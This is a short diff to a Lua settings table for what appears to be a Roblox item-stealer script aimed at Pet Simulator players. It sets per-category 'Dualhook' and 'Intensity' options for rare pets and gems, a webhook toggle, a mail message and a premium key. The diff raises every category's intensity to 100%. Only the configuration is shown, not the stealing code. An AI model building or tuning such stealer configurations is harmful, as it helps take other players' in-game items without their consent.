@@ -2,42 +2,42 @@ getgenv().Settings = {
     PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
     Webhook = true, -- By Making This True The Users Of Your Script Will Be Able
     -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
-    MailMessage = "Free Huge Bang",
+    MailMessage = "Buat Lu Monz Gua Fans Lu",
   Titanics = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
   },
   Banana = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
   },
   Huges = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
   },
   Pogs = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
   },
    Exclusives = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
   },
    Events = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
   },
    Secrets = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
    },
    HC_DM_Mythics = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
    },
    Gems = {
        Dualhook = false,
-       Intensity = false,
+       Intensity = 100--%
   }
 }
     
